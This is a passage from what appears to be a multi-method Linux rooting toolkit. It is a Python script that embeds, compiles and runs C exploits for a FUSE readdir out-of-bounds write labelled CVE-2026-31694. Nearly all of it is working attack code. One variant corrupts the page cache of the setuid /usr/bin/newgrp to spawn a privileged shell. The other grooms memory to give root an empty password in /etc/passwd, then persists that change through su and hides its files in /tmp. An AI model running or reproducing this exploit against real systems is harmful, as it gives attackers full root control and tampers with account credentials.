		close(pipefd[0]);
		memset(&srv, 0, sizeof(srv));
		srv.targets = opt->targets;
		memcpy(srv.overflow_tail, suid_execve_sh_tail, sizeof(srv.overflow_tail));
		srv.fd = mount_with_fusermount3(opt);
		if (pthread_create(&tid, NULL, fuse_loop, &srv)) die("pthread_create");
		msg("[server] malicious FUSE mounted as uid=%d", getuid());
		write_full(pipefd[1], "R", 1);
		close(pipefd[1]);
		pthread_join(tid, NULL);
		_exit(0);
	}

	close(pipefd[1]);
	if (read(pipefd[0], &ready, 1) != 1) die("server did not become ready");
	close(pipefd[0]);
	return pid;
}

static void unmount_fuse(const struct options *opt)
{
	pid_t pid;
	int status;
	pid = fork();
	if (pid < 0) return;
	if (pid == 0) { execlp("fusermount3", "fusermount3", "-u", "-z", opt->mountpoint, NULL); _exit(127); }
	if (waitpid(pid, &status, 0) < 0) return;
	if (!WIFEXITED(status) || WEXITSTATUS(status)) msg("[cleanup] warning: fusermount3 -u exited status=0x%x", status);
}

static void terminate_child(pid_t pid)
{
	int status;
	if (pid <= 0) return;
	if (kill(pid, SIGTERM) && errno != ESRCH) msg("[cleanup] warning: kill(%d): %s", pid, strerror(errno));
	while (waitpid(pid, &status, 0) < 0 && errno == EINTR) ;
}

static void cleanup_workdir(const struct options *opt)
{
	char path[PATH_MAX];
	if (opt->keep_workdir) { msg("[cleanup] preserving workdir %s", opt->workdir); return; }
	for (unsigned int i = 0; i < opt->targets; i++) {
		target_path(path, sizeof(path), opt, i);
		if (unlink(path) && errno != ENOENT) msg("[cleanup] warning: unlink %s: %s", path, strerror(errno));
	}
	if (rmdir(opt->target_dir) && errno != ENOENT) msg("[cleanup] warning: rmdir %s: %s", opt->target_dir, strerror(errno));
	if (rmdir(opt->mountpoint) && errno != ENOENT) msg("[cleanup] warning: rmdir %s: %s", opt->mountpoint, strerror(errno));
	if (rmdir(opt->workdir) && errno != ENOENT) msg("[cleanup] warning: rmdir %s: %s", opt->workdir, strerror(errno));
}

static void write_decoy_target(const struct options *opt, unsigned int idx)
{
	unsigned char page0[PAGE_SZ];
	unsigned char page1[PAGE_SZ];
	char path[PATH_MAX];
	char line[64];
	int fd;
	int n;

	memset(page0, '\n', sizeof(page0));
	memcpy(page0, "#!/bin/sh\n", 10);
	memset(page1, '\n', sizeof(page1));
	n = snprintf(line, sizeof(line), "echo clean target %05u\n", idx);
	if (n < 0 || (size_t)n >= sizeof(line)) die("target line too long");
	memcpy(page1, line, (size_t)n);

	target_path(path, sizeof(path), opt, idx);
	if (chmod(path, 0644) && errno != ENOENT && errno != EPERM) die("chmod target %s", path);
	fd = open(path, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0555);
	if (fd < 0) die("create target %s", path);
	write_full(fd, page0, sizeof(page0));
	write_full(fd, page1, sizeof(page1));
	if (fchmod(fd, 0555)) die("fchmod target %s", path);
	if (fdatasync(fd)) die("fdatasync target %s", path);
	close(fd);
}

static void prepare_decoy_targets(const struct options *opt)
{
	msg("[poc uid %d] generating %u sacrificial two-page targets", getuid(), opt->targets);
	for (unsigned int i = 0; i < opt->targets; i++)
		write_decoy_target(opt, i);
}

static void prime_and_drop_decoy(const struct options *opt, unsigned int idx)
{
	unsigned char buf[PAGE_SZ * 2];
	char path[PATH_MAX];
	int fd;
	ssize_t n;
	int err;

	target_path(path, sizeof(path), opt, idx);
	fd = open(path, O_RDONLY | O_CLOEXEC);
	if (fd < 0) die("open target %s", path);
	err = posix_fadvise(fd, 0, sizeof(buf), POSIX_FADV_DONTNEED);
	if (err) msg("[attacker] warning: fadvise drop %s: %s", path, strerror(err));
	n = pread(fd, buf, sizeof(buf), 0);
	if (n != (ssize_t)sizeof(buf)) die("short read on %s", path);
	err = posix_fadvise(fd, 0, PAGE_SZ, POSIX_FADV_DONTNEED);
	if (err) msg("[attacker] warning: fadvise page0 %s: %s", path, strerror(err));
	close(fd);
}

static void prime_and_drop_decoys(const struct options *opt)
{
	for (unsigned int i = 0; i < opt->targets; i++)
		prime_and_drop_decoy(opt, i);
}

static int find_corrupted_decoy(const struct options *opt)
{
	for (unsigned int i = 0; i < opt->targets; i++) {
		char path[PATH_MAX];
		unsigned char got[sizeof(suid_execve_sh_tail)];
		int fd;
		ssize_t n;

		target_path(path, sizeof(path), opt, i);
		fd = open(path, O_RDONLY | O_CLOEXEC);
		if (fd < 0) die("open target for check");
		n = pread(fd, got, sizeof(got), PAGE_SZ);
		close(fd);
		if (n == (ssize_t)sizeof(got) && !memcmp(got, suid_execve_sh_tail, sizeof(got)))
			return (int)i;
	}
	return -1;
}

static void prime_and_drop_suid_target(const struct options *opt)
{
	unsigned char buf[PAGE_SZ * 2];
	off_t drop_off = opt->suid_offset - PAGE_SZ;
	int fd;
	int err;

	fd = open(opt->suid_path, O_RDONLY | O_CLOEXEC);
	if (fd < 0) die("open %s", opt->suid_path);
	err = posix_fadvise(fd, drop_off, sizeof(buf), POSIX_FADV_DONTNEED);
	if (err) msg("[attacker] warning: fadvise drop %s@0x%jx: %s", opt->suid_path, (intmax_t)drop_off, strerror(err));
	pread_full(fd, buf, sizeof(buf), drop_off);
	err = posix_fadvise(fd, drop_off, PAGE_SZ, POSIX_FADV_DONTNEED);
	if (err) msg("[attacker] warning: fadvise page %s@0x%jx: %s", opt->suid_path, (intmax_t)drop_off, strerror(err));
	close(fd);
}

static bool suid_target_is_corrupted(const struct options *opt)
{
	unsigned char got[sizeof(suid_execve_sh_tail)];
	int fd;
	ssize_t n;

	fd = open(opt->suid_path, O_RDONLY | O_CLOEXEC);
	if (fd < 0) die("open setuid target for check");
	n = pread(fd, got, sizeof(got), opt->suid_offset);
	close(fd);
	return n == (ssize_t)sizeof(got) && !memcmp(got, suid_execve_sh_tail, sizeof(got));
}

static void trigger_one_dir(const struct options *opt, unsigned int idx)
{
	char path[PATH_MAX];
	unsigned char buf[8192];
	int fd;
	long n;

	fuse_dir_path(path, sizeof(path), opt, idx);
	fd = open(path, O_RDONLY | O_DIRECTORY | O_CLOEXEC);
	if (fd < 0) return;
	n = syscall(SYS_getdents64, fd, buf, sizeof(buf));
	if (n < 0 && errno != EIO) msg("[attacker] getdents64(%s): %s", path, strerror(errno));
	close(fd);
}

static int execute_corrupted_suid(const struct options *opt)
{
	char *const interactive_argv[] = { "/bin/sh", "-p", "-i", NULL };
	char *const command_argv[] = { "/bin/sh", "-p", "-c", (char *)opt->cmd, NULL };
	char *const *argv = opt->interactive ? interactive_argv : command_argv;
	pid_t pid;
	int status;

	msg("[attacker uid %d] executing corrupted setuid target: %s", getuid(), opt->suid_path);
	pid = fork();
	if (pid < 0) die("fork setuid target");
	if (pid == 0) {
		execve(opt->suid_path, argv, environ);
		die("execve setuid target");
	}
	if (waitpid(pid, &status, 0) < 0) die("waitpid setuid target");
	msg("[attacker uid %d] setuid target exited with status=0x%x", getuid(), status);
	return status;
}

static int run_exploit(const struct options *opt)
{
	unsigned int absorbed = 0;
	unsigned int unabsorbed = 0;

	msg("[attacker uid %d] target: %s @ file offset 0x%jx", getuid(), opt->suid_path, (intmax_t)opt->suid_offset);
	msg("[attacker uid %d] starting setuid page-cache overwrite attempts", getuid());

	for (unsigned int round = 0; round < opt->rounds; round++) {
		msg("[attacker uid %d] round %u/%u", getuid(), round + 1, opt->rounds);
		for (unsigned int i = 0; i < opt->targets; i++) {
			int decoy_hit;

			prime_and_drop_decoys(opt);
			prime_and_drop_suid_target(opt);
			trigger_one_dir(opt, i);

			if (suid_target_is_corrupted(opt)) {
				msg("[attacker uid %d] observed corrupted setuid executable page after trigger %u: %s", getuid(), i, opt->suid_path);
				return execute_corrupted_suid(opt);
			}

			decoy_hit = find_corrupted_decoy(opt);
			if (decoy_hit >= 0) {
				absorbed++;
				write_decoy_target(opt, (unsigned int)decoy_hit);
				continue;
			}

			unabsorbed++;
			if (unabsorbed > opt->max_unabsorbed) {
				msg("[attacker uid %d] stopping after too many unabsorbed misses", getuid());
				msg("[attacker uid %d] absorbed=%u unabsorbed=%u", getuid(), absorbed, unabsorbed);
				return 2;
			}
		}
	}

	msg("[attacker uid %d] no setuid impact after %u rounds", getuid(), opt->rounds);
	msg("[attacker uid %d] absorbed=%u unabsorbed=%u", getuid(), absorbed, unabsorbed);
	return 1;
}

static void usage(const char *argv0)
{
	fprintf(stderr, "usage: %s [--workdir DIR] [--targets N] [--rounds N] [--max-unabsorbed N] [--suid-path PATH] [--suid-offset OFF] [--cmd CMD] [--interactive] [--keep]\n", argv0);
}

static unsigned int parse_uint(const char *s, const char *name)
{
	char *end;
	unsigned long v;
	errno = 0;
	v = strtoul(s, &end, 10);
	if (errno || *end || v == 0 || v > 1000000) die("invalid %s: %s", name, s);
	return (unsigned int)v;
}

static off_t parse_offset(const char *s, const char *name)
{
	char *end;
	unsigned long long v;
	errno = 0;
	v = strtoull(s, &end, 0);
	if (errno || *end || v > LLONG_MAX) die("invalid %s: %s", name, s);
	return (off_t)v;
}

static struct options parse_options(int argc, char **argv)
{
	struct options opt = {
		.suid_path = "/usr/bin/newgrp",
		.cmd = "id; echo LPE-OK",
		.suid_offset = 0x2000,
		.targets = DEFAULT_TARGETS,
		.rounds = DEFAULT_ROUNDS,
		.max_unabsorbed = DEFAULT_MAX_UNABSORBED,
	};

	for (int i = 1; i < argc; i++) {
		if (!strcmp(argv[i], "--workdir") && i + 1 < argc) {
			size_t len = strlen(argv[++i]);
			if (len >= sizeof(opt.workdir)) die("workdir path too long");
			memcpy(opt.workdir, argv[i], len + 1);
		} else if (!strcmp(argv[i], "--targets") && i + 1 < argc) {
			opt.targets = parse_uint(argv[++i], "targets");
		} else if (!strcmp(argv[i], "--rounds") && i + 1 < argc) {
			opt.rounds = parse_uint(argv[++i], "rounds");
		} else if (!strcmp(argv[i], "--max-unabsorbed") && i + 1 < argc) {
			opt.max_unabsorbed = parse_uint(argv[++i], "max-unabsorbed");
		} else if (!strcmp(argv[i], "--suid-path") && i + 1 < argc) {
			opt.suid_path = argv[++i];
		} else if (!strcmp(argv[i], "--suid-offset") && i + 1 < argc) {
			opt.suid_offset = parse_offset(argv[++i], "suid-offset");
		} else if (!strcmp(argv[i], "--cmd") && i + 1 < argc) {
			opt.cmd = argv[++i];
		} else if (!strcmp(argv[i], "--interactive")) {
			opt.interactive = true;
		} else if (!strcmp(argv[i], "--keep")) {
			opt.keep_workdir = true;
		} else {
			usage(argv[0]);
			exit(EXIT_FAILURE);
		}
	}

	return opt;
}

int main(int argc, char **argv)
{
	struct options opt = parse_options(argc, argv);
	pid_t server = -1;
	int rc;

	setup_paths(&opt);
	preflight(&opt);
	prepare_decoy_targets(&opt);
	server = start_fuse_server(&opt);
	rc = run_exploit(&opt);
	unmount_fuse(&opt);
	terminate_child(server);
	cleanup_workdir(&opt);
	return rc == 0 ? 0 : 1;
}
'''

def _cve_2026_31694_cleanup(*paths):
    for p in paths:
        try:
            os.remove(p)
        except OSError:
            pass


def _cve_2026_31694_compile_and_run():
    """Tulis source C, compile, jalankan. Return True kalau root."""
    cc = shutil.which("gcc") or shutil.which("cc")
    if not cc:
        log("[-] No gcc/cc — skip compile")
        return False
    log("[+] compiler: %s" % cc)

    tag = "%08x" % (os.getpid() ^ int(time.time()))
    c_path = "/tmp/.fu_%s.c" % tag
    bin_path = "/tmp/.fu_%s" % tag

    try:
        with open(c_path, "w") as f:
            f.write(CVE_2026_31694_C_SOURCE)
    except OSError as e:
        log("[-] write source: %s" % e)
        return False

    log("[*] compiling...")
    try:
        r = subprocess.run(
            [cc, "-O2", "-w", "-o", bin_path, c_path, "-pthread"],
            capture_output=True, timeout=300
        )
        if r.returncode != 0:
            err = r.stderr.decode(errors="replace")[:400]
            log("[-] compile failed: %s" % err)
            _cve_2026_31694_cleanup(c_path, bin_path)
            return False
    except Exception as e:
        log("[-] compile error: %s" % e)
        _cve_2026_31694_cleanup(c_path, bin_path)
        return False

    if not os.path.isfile(bin_path):
        log("[-] binary not produced")
        _cve_2026_31694_cleanup(c_path, bin_path)
        return False

    try:
        os.chmod(bin_path, 0o755)
    except OSError:
        pass
    log("[+] compiled: %s" % bin_path)

    log("[*] running CVE-2026-31694 (timeout 300s)...")
    try:
        p = subprocess.Popen([bin_path])
        try:
            p.wait(timeout=300)
            rc = p.returncode
        except subprocess.TimeoutExpired:
            p.kill()
            try:
                p.wait(timeout=5)
            except Exception:
                pass
            log("[-] timeout")
            _cve_2026_31694_cleanup(c_path, bin_path)
            return False
    except Exception as e:
        log("[-] run error: %s" % e)
        _cve_2026_31694_cleanup(c_path, bin_path)
        return False

    _cve_2026_31694_cleanup(c_path, bin_path)

    # Verifikasi: cek /usr/bin/newgrp offset 0x2000 sudah di-overwrite
    try:
        with open("/usr/bin/newgrp", "rb") as f:
            f.seek(0x2000)
            marker = f.read(4)
            # shellcode: f3 0f 1e fa
            if marker == b"\xf3\x0f\x1e\xfa":
                return True
    except OSError:
        pass
    if os.geteuid() == 0:
        return True
    if rc == 0:
        return True
    return False


def try_cve_2026_31694():
    log("\n[=== METHOD 9: CVE-2026-31694 (FUSE readdir page-cache overflow) ===]")

    # cek sudah root
    if os.geteuid() == 0:
        log("[+] already root")
        _reattach_tty()
        os.execl("/bin/sh", "sh")
        return True

    # cek arsitektur
    arch = os.uname().machine
    if arch not in ("x86_64", "amd64"):
        log("[-] x86_64 only (got %s)" % arch)
        return False

    # ── v1: cross-cache, SUID target ──
    log("[*] M9 v1: cross-cache + SUID target")
    if _cve_2026_31694_compile_and_run():
        log("[+++] M9 v1 succeeded — root obtained")
        _reattach_tty()
        os.execl("/bin/sh", "sh")
        return True

    # ── v2: PCP drain, /etc/passwd target ──
    log("[*] M9 v1 failed, trying v2 (PCP drain + /etc/passwd)...")
    if _fuse_oob_v2():
        return True

    log("[-] M9 failed (v1 and v2)")
    return False

# ──────────────────────────────────────────────────
# METHOD 9 v2: FUSE readdir OOB (PCP drain + /etc/passwd target)
# ──────────────────────────────────────────────────

FUSE_OOB_V2_C_SOURCE = r'''
/*
 * FUSE readdir cache OOB write - LPE (v2)
 *
 * Bug: fuse_add_dirent_to_cache() does memcpy(addr, dirent, 4120) into
 * a 4096-byte page when namelen=4095, overflowing 24 bytes into PFN+1.
 *
 * Grooming: drain PCP + allocate pool -> consecutive physical pages.
 * Target: /etc/passwd (empty root password via 23-byte overwrite).
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sched.h>
#include <dirent.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <linux/fuse.h>
#include <pthread.h>
#include <stdint.h>

#define PAGE_SZ           4096
#define FUSE_BUFSIZE      (64 * 1024)
#define DRAIN_BLOCK_SIZE  (256 * PAGE_SZ)
#define DRAIN_MAX_BLOCKS  1024
#define POOL_SIZE         128

static int drain_nblocks = 0;

#define OVERFLOW_NAMELEN  4095
#define OVERFLOW_RECLEN   4120
#define OVERFLOW_CTRL     23
#define FUSE_HDR_SZ       24

static const char PAYLOAD[OVERFLOW_CTRL] = "root::0:0:x:.:\n#######";
static const char MARKER[OVERFLOW_CTRL]  = "DEADBEEF_OOB_WRITE_HIT!";

#define FUSE_ROOT_ID_     1
#define DIR_NODEID_BASE   100
#define MAX_ATTEMPTS      200
#define WARMUP_ROUNDS     5

static int fuse_fd = -1;
static char *mountpoint = NULL;
static int attempt_num = 0;

static pthread_mutex_t mtx = PTHREAD_MUTEX_INITIALIZER;
static pthread_cond_t cond_arrived = PTHREAD_COND_INITIALIZER;
static pthread_cond_t cond_respond = PTHREAD_COND_INITIALIZER;
static int readdir_arrived = 0;
static int readdir_respond = 0;

static void compute_drain_size(void) {
	long free_kb = 0;
	FILE *f = fopen("/proc/meminfo", "r");
	if (f) {
		char line[256];
		while (fgets(line, sizeof(line), f))
			if (sscanf(line, "MemFree: %ld kB", &free_kb) == 1) break;
		fclose(f);
	}
	if (free_kb <= 0) {
		drain_nblocks = 4;
	} else {
		long drain_bytes = (free_kb / 20) * 1024;  /* 5% (safe di WSL2) */
		drain_nblocks = (int)(drain_bytes / DRAIN_BLOCK_SIZE);
		if (drain_nblocks < 4) drain_nblocks = 4;
		if (drain_nblocks > DRAIN_MAX_BLOCKS) drain_nblocks = DRAIN_MAX_BLOCKS;
	}
	fprintf(stderr, "[drain] MemFree=%ldMB -> drain=%d blocks\n",
		free_kb / 1024, drain_nblocks);
}

static char passwd_backup[16384];
static ssize_t passwd_backup_len = 0;
static char dirent_buf[OVERFLOW_RECLEN];

static void die(const char *msg) { perror(msg); _exit(1); }

static void pin_cpu(int cpu) {
	cpu_set_t set; CPU_ZERO(&set); CPU_SET(cpu, &set);
	sched_setaffinity(0, sizeof(set), &set);
}

static void fuse_reply(uint64_t unique, int32_t error, const void *data, size_t datalen) {
	struct fuse_out_header oh = { .len = sizeof(oh) + datalen, .error = error, .unique = unique };
	struct iovec iov[2] = {{ &oh, sizeof(oh) }, { (void*)data, datalen }};
	(void)writev(fuse_fd, iov, datalen ? 2 : 1);
}
static void fuse_reply_err(uint64_t u, int e) { fuse_reply(u, -e, NULL, 0); }
static void fill_attr(struct fuse_attr *a, uint64_t ino, int dir) {
	memset(a, 0, sizeof(*a)); a->ino = ino;
	a->size = dir ? 4096 : 0; a->mode = dir ? (S_IFDIR|0755) : (S_IFREG|0644);
	a->nlink = dir ? 2 : 1; a->uid = getuid(); a->gid = getgid(); a->blksize = 4096;
}
static void handle_init(struct fuse_in_header *h, void *body) {
	(void)body; struct fuse_init_out out = {0};
	out.major = FUSE_KERNEL_VERSION; out.minor = FUSE_KERNEL_MINOR_VERSION;
	out.max_background = 16; out.congestion_threshold = 12;
	out.max_write = 4096; out.time_gran = 1; out.max_pages = 2;
	fuse_reply(h->unique, 0, &out, sizeof(out));
}
static void handle_lookup(struct fuse_in_header *h, char *name) {
	if (strncmp(name, "trigdir", 7) == 0) {
		uint64_t nid = DIR_NODEID_BASE + (uint64_t)attempt_num;
		struct fuse_entry_out out = {0};
		out.nodeid = nid; out.generation = 1;
		fill_attr(&out.attr, nid, 1);
		fuse_reply(h->unique, 0, &out, sizeof(out));
	} else fuse_reply_err(h->unique, ENOENT);
}
static void handle_getattr(struct fuse_in_header *h) {
	struct fuse_attr_out out = {0};
	fill_attr(&out.attr, h->nodeid,
	          h->nodeid == FUSE_ROOT_ID_ || h->nodeid >= DIR_NODEID_BASE);
	fuse_reply(h->unique, 0, &out, sizeof(out));
}
static void handle_opendir(struct fuse_in_header *h) {
	struct fuse_open_out out = {0};
	out.fh = 0x100 + attempt_num; out.open_flags = (1<<3);
	fuse_reply(h->unique, 0, &out, sizeof(out));
}
static void handle_readdir(struct fuse_in_header *h, void *body) {
	struct fuse_read_in *ri = body;
	if (ri->offset != 0) { fuse_reply(h->unique, 0, NULL, 0); return; }
	pthread_mutex_lock(&mtx);
	readdir_arrived = 1; pthread_cond_signal(&cond_arrived);
	while (!readdir_respond) pthread_cond_wait(&cond_respond, &mtx);
	readdir_respond = 0; readdir_arrived = 0;
	pthread_mutex_unlock(&mtx);
	fuse_reply(h->unique, 0, dirent_buf, OVERFLOW_RECLEN);
}
static void *fuse_loop(void *arg) {
	(void)arg; char buf[FUSE_BUFSIZE];
	while (1) {
		ssize_t n = read(fuse_fd, buf, sizeof(buf));
		if (n < 0) { if (errno == ENODEV || errno == EBADF) break; continue; }
		struct fuse_in_header *h = (struct fuse_in_header *)buf;
		void *body = buf + sizeof(*h);
		switch (h->opcode) {
		case FUSE_INIT: handle_init(h, body); break;
		case FUSE_LOOKUP: handle_lookup(h, body); break;
		case FUSE_GETATTR: handle_getattr(h); break;
		case FUSE_OPENDIR: handle_opendir(h); break;
		case FUSE_READDIR: handle_readdir(h, body); break;
		case FUSE_RELEASEDIR: case FUSE_RELEASE: case FUSE_FLUSH:
			fuse_reply(h->unique, 0, NULL, 0); break;
		case FUSE_FORGET: break;
		case FUSE_STATFS: {
			struct fuse_statfs_out s = {0};
			s.st.blocks=1000; s.st.bfree=500; s.st.bavail=500;
			s.st.namelen=255; s.st.bsize=4096;
			fuse_reply(h->unique, 0, &s, sizeof(s)); break;
		}
		default: fuse_reply_err(h->unique, ENOSYS); break;
		}
	}
	return NULL;
}

static void build_dirent(const char *payload) {
	struct fuse_dirent *d = (struct fuse_dirent *)dirent_buf;
	memset(dirent_buf, 0, sizeof(dirent_buf));
	d->ino = 1000; d->off = 1; d->namelen = OVERFLOW_NAMELEN; d->type = DT_REG;
	memset(d->name, 'A', OVERFLOW_NAMELEN);
	memcpy(d->name + (PAGE_SZ - FUSE_HDR_SZ), payload, OVERFLOW_CTRL);
	dirent_buf[OVERFLOW_RECLEN - 1] = '\n';
}

static void *trigger_readdir(void *arg) {
	int a = *(int *)arg; pin_cpu(0);
	char path[512];
	snprintf(path, sizeof(path), "%s/trigdir_%d", mountpoint, a);
	DIR *d = opendir(path);
	if (!d) { perror("opendir"); return NULL; }
	(void)readdir(d); closedir(d); return NULL;
}
static void finish_readdir(pthread_t trig) {
	pthread_mutex_lock(&mtx);
	readdir_respond = 1; pthread_cond_signal(&cond_respond);
	pthread_mutex_unlock(&mtx);
	pthread_join(trig, NULL);
}

struct pool_state {
	void *drain_blocks[DRAIN_MAX_BLOCKS];
	int   drain_count;
	void *pool[POOL_SIZE];
};

static void alloc_pool(struct pool_state *st) {
	st->drain_count = 0;
	for (int i = 0; i < drain_nblocks; i++) {
		st->drain_blocks[i] = mmap(NULL, DRAIN_BLOCK_SIZE,
		                           PROT_READ | PROT_WRITE,
		                           MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE,
		                           -1, 0);
		if (st->drain_blocks[i] == MAP_FAILED) { st->drain_blocks[i] = NULL; break; }
		*(volatile char *)st->drain_blocks[i] = (char)i;
		*(volatile char *)(st->drain_blocks[i] + DRAIN_BLOCK_SIZE - PAGE_SZ) = (char)i;
		st->drain_count++;
	}
	for (int i = 0; i < POOL_SIZE; i++) {
		st->pool[i] = mmap(NULL, PAGE_SZ, PROT_READ | PROT_WRITE,
		                   MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
		if (st->pool[i] != MAP_FAILED)
			*(volatile char *)st->pool[i] = (char)i;
	}
}

static void free_pool(struct pool_state *st) {
	for (int i = 0; i < POOL_SIZE; i++)
		if (st->pool[i] && st->pool[i] != MAP_FAILED)
			{ munmap(st->pool[i], PAGE_SZ); st->pool[i] = NULL; }
	for (int i = 0; i < st->drain_count; i++)
		if (st->drain_blocks[i])
			{ munmap(st->drain_blocks[i], DRAIN_BLOCK_SIZE); st->drain_blocks[i] = NULL; }
	st->drain_count = 0;
}

static int attempt_poc(void) {
	attempt_num++;
	pthread_mutex_lock(&mtx);
	readdir_arrived = 0; readdir_respond = 0;
	pthread_mutex_unlock(&mtx);

	pthread_t trig;
	pthread_create(&trig, NULL, trigger_readdir, &attempt_num);
	pthread_mutex_lock(&mtx);
	while (!readdir_arrived) pthread_cond_wait(&cond_arrived, &mtx);
	pthread_mutex_unlock(&mtx);

	pin_cpu(0);
	struct pool_state st;
	memset(&st, 0, sizeof(st));
	alloc_pool(&st);

	int idx = (attempt_num % (POOL_SIZE - 1));
	void *page0 = st.pool[idx];
	void *page1 = st.pool[idx + 1];

	if (!page0 || page0 == MAP_FAILED || !page1 || page1 == MAP_FAILED) {
		free_pool(&st);
		finish_readdir(trig);
		return 0;
	}

	memset(page1, 'V', PAGE_SZ);
	munmap(page0, PAGE_SZ);
	st.pool[idx] = NULL;
	finish_readdir(trig);
	int hit = (memcmp(page1, MARKER, OVERFLOW_CTRL) == 0);
	free_pool(&st);
	return hit;
}

static int attempt_lpe(void) {
	attempt_num++;
	pin_cpu(0);
	struct pool_state st;
	memset(&st, 0, sizeof(st));
	alloc_pool(&st);

	int idx = (attempt_num % (POOL_SIZE - 1));
	void *before = st.pool[idx];
	void *after  = st.pool[idx + 1];

	if (!before || before == MAP_FAILED || !after || after == MAP_FAILED) {
		free_pool(&st);
		return 0;
	}

	pthread_mutex_lock(&mtx);
	readdir_arrived = 0; readdir_respond = 0;
	pthread_mutex_unlock(&mtx);

	pthread_t trig;
	pthread_create(&trig, NULL, trigger_readdir, &attempt_num);
	pthread_mutex_lock(&mtx);
	while (!readdir_arrived) pthread_cond_wait(&cond_arrived, &mtx);
	pthread_mutex_unlock(&mtx);

	int passwd_fd = open("/etc/passwd", O_RDONLY);
	if (passwd_fd < 0) die("open passwd");
	posix_fadvise(passwd_fd, 0, 0, POSIX_FADV_DONTNEED);

	munmap(after, PAGE_SZ);
	st.pool[idx + 1] = NULL;
	char tmp;
	(void)pread(passwd_fd, &tmp, 1, 0);

	munmap(before, PAGE_SZ);
	st.pool[idx] = NULL;

	finish_readdir(trig);

	char check[80] = {0};
	(void)pread(passwd_fd, check, 79, 0);
	int hit = (memcmp(check, "root::0:0:x:.:", 14) == 0);

	close(passwd_fd);
	free_pool(&st);
	return hit ? 1 : 0;
}

static int setup_fuse(void) {
	int sv[2];
	mountpoint = strdup("/tmp/fuse_oob_XXXXXX");
	if (!mkdtemp(mountpoint)) die("mkdtemp");
	if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) < 0) die("socketpair");
	pid_t pid = fork();
	if (pid < 0) die("fork");
	if (pid == 0) {
		close(sv[0]); char e[32];
		snprintf(e, sizeof(e), "_FUSE_COMMFD=%d", sv[1]); putenv(e);
		execl("/bin/fusermount3", "fusermount3", mountpoint, NULL);
		execl("/usr/bin/fusermount3", "fusermount3", mountpoint, NULL);
		die("fusermount3");
	}
	close(sv[1]);
	struct msghdr msg = {0}; char cmsg_buf[CMSG_SPACE(sizeof(int))];
	char data; struct iovec iov = { &data, 1 };
	msg.msg_iov = &iov; msg.msg_iovlen = 1;
	msg.msg_control = cmsg_buf; msg.msg_controllen = sizeof(cmsg_buf);
	if (recvmsg(sv[0], &msg, 0) < 0) die("recvmsg");
	struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
	if (!cmsg || cmsg->cmsg_type != SCM_RIGHTS) return -1;
	fuse_fd = *(int*)CMSG_DATA(cmsg); close(sv[0]);
	int st2; waitpid(pid, &st2, 0);
	return (WIFEXITED(st2) && WEXITSTATUS(st2)==0) ? 0 : -1;
}

static void cleanup(void) {
	if (!mountpoint) return;
	char cmd[256];
	snprintf(cmd, sizeof(cmd), "fusermount3 -u %s 2>/dev/null; "
	         "umount -l %s 2>/dev/null", mountpoint, mountpoint);
	(void)system(cmd); rmdir(mountpoint);
}

int main(int argc, char **argv) {
	int poc_only = 0, num_rounds = 30;
	for (int i = 1; i < argc; i++) {
		if (strcmp(argv[i], "--poc") == 0) poc_only = 1;
		else if (strcmp(argv[i], "-n") == 0 && i+1 < argc)
			num_rounds = atoi(argv[++i]);
	}
	setbuf(stdout, NULL); setbuf(stderr, NULL); pin_cpu(0);

	if (geteuid() == 0) { execl("/bin/sh", "sh", NULL); return 0; }

	compute_drain_size();
	printf("=== FUSE readdir OOB v2 - LPE ===\n");
	printf("=== drain %d blocks + pool %d ===\n\n", drain_nblocks, POOL_SIZE);

	if (setup_fuse() < 0) return 1;
	printf("[+] FUSE at %s\n", mountpoint);

	if (!poc_only) {
		int bfd = open("/etc/passwd", O_RDONLY);
		if (bfd >= 0) {
			passwd_backup_len = read(bfd, passwd_backup, sizeof(passwd_backup) - 1);
			close(bfd);
			if (passwd_backup_len > 0) {
				passwd_backup[passwd_backup_len] = '\0';
				FILE *bf = fopen("/tmp/.passwd_backup", "w");
				if (bf) { fwrite(passwd_backup, 1, passwd_backup_len, bf); fclose(bf); }
				printf("[+] /etc/passwd backed up (%zd bytes)\n", passwd_backup_len);
			}
		}
	}

	pthread_t ft; pthread_create(&ft, NULL, fuse_loop, NULL);
	usleep(300000);

	if (poc_only) {
		build_dirent(MARKER);
		int hits = 0;
		for (int i = 0; i < num_rounds; i++) {
			int r = attempt_poc();
			if (r) hits++;
			usleep(5000);
		}
		printf("\n=== PoC: %d/%d hits ===\n", hits, num_rounds);
		cleanup(); return (hits > 0) ? 0 : 1;
	}

	printf("--- Warmup ---\n");
	build_dirent(MARKER);
	int wh = 0;
	for (int i = 0; i < WARMUP_ROUNDS; i++) {
		int r = attempt_poc();
		if (r) wh++;
		usleep(5000);
	}
	printf("[+] Warmup: %d/%d\n", wh, WARMUP_ROUNDS);
	if (wh == 0) {
		printf("[-] No warmup hits\n");
		cleanup(); return 1;
	}

	printf("\n--- LPE ---\n");
	build_dirent(PAYLOAD);
	for (int i = 0; i < MAX_ATTEMPTS; i++) {
		int result = attempt_lpe();
		if (result == 1) {
			printf("[+] HIT after %d attempts\n", i+1);

			/* Post-exploit: persist + drop caches as root */
			if (passwd_backup_len > 0) {
				char *first_nl = strchr(passwd_backup, '\n');
				if (first_nl) {
					char new_passwd[16384];
					int nlen = snprintf(new_passwd, sizeof(new_passwd),
					                    "root::0:0:root:/root:/bin/sh\n%s",
					                    first_nl + 1);
					FILE *fp = fopen("/tmp/.passwd_new", "w");
					if (fp) { fwrite(new_passwd, 1, nlen, fp); fclose(fp); }
				}
			}

			(void)system(
				"echo '' | su -s /bin/sh -c '"
				"cp /tmp/.passwd_new /etc/passwd && "
				"chmod 644 /etc/passwd && "
				"rm -f /tmp/.passwd_new /tmp/.passwd_backup && "
				"echo 3 > /proc/sys/vm/drop_caches 2>/dev/null; "
				"echo [+] done"
				"' root 2>/dev/null"
			);

			cleanup();
			execl("/bin/su", "su", "-s", "/bin/sh", "root", NULL);
			(void)system("echo '' | su -s /bin/sh root");
			return 0;
		}
		usleep(10000);
	}
	printf("\n[-] Failed after %d attempts\n", MAX_ATTEMPTS);
	cleanup(); return 1;
}
'''
